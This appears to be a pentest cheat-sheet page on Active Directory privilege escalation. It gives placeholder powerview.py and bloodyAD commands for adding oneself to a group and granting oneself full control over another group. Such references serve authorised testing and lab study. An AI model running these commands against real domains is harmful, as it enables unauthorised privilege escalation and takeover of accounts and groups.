---
title: "AddSelf"
date: 2024-8-2
tags: ["addself", "active directory", "ad", "domain controller", "Windows", "powerview", "bloodAD", "privesc"]
---

---
### Privesc #1: Add self to group (From Linux)

{{< tab set1 tab1 active >}}powerview.py{{< /tab >}}
{{< tab set1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```bash
# Connect
sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN>
```

```bash
# Add self to group
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME>
```

```bash
# Check
Get-DomainGroupMember -Identity <TARGET_GROUP>
```

```bash
# Exit and login again to apply changes
Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol
```

```bash
# Check
Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>"
```

</div>

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```bash
# Add self to group
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME>
```

```bash
# After getting full control of target group (e.g. TARGET_GROUP has genericall over ANOTHER_GROUP)
python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add genericAll 'OU=<ANOTHER_GROUP>,DC=<EXAMPLE>,DC=<COM>' <USERNAME>
```

</div>

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}

<br>